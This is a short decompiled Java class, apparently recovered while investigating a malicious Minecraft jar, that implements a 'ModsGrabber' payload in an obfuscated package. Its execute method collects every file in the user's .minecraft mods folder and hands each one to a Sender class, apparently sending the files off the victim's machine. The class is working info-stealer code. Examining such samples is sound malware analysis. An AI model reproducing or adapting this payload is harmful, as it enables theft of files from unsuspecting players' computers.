/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.FileUtil;
/*    */ import java.io.File;
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class ModsGrabber
/*    */   implements Payload
/*    */ {
/*    */   public void execute() {
/* 14 */     for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\mods")) Sender.send(file); 
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\ModsGrabber.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */